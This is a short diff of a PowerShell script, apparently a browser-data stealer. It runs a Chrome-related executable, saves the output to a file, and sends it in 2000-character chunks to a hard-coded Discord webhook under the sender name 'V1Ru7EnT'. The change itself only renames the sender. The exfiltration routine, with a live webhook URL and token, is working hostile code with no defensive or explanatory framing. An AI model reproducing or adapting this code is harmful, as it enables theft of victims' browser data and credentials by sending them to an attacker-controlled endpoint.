@@ -69,9 +69,9 @@ $chromeOutput = & $chromePath | Out-File $FileName -Append;
 $args1 = Get-Content .\$FileName;
 
 $statOutput = $args1 | Out-String;
-    $webhookUrl = 'https://discord.com/api/webhooks/1256048768206241803/BWYs2QrnsKznXQ9dSCCX4FJVvQvHKn9KpcvXFHJoKL5iWCRW_FWMravdB-8qJfslVn_n';
+    $webhookUrl = 'https://discord.com/api/webhooks/1256048768206241803/BWYs2QrnsKznXQ9dSCCX4FJVvQvHKn9KpcvXFHJoKL5iWCRW_FWMravdB-8qJfslVn_n'; 
     $chunks = [Math]::Ceiling($statOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $statOutput.Length - $start);$content = $statOutput.Substring($start, $length); 
-    $webhookContent = @{'username' = '${env:computername}';'content' = $content;};  
+    $webhookContent = @{'username' = 'V1Ru7EnT';'content' = $content;};  
     $jsonData = ConvertTo-Json -InputObject $webhookContent;IWR -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;};
 
 ########################################################################################################################################################################
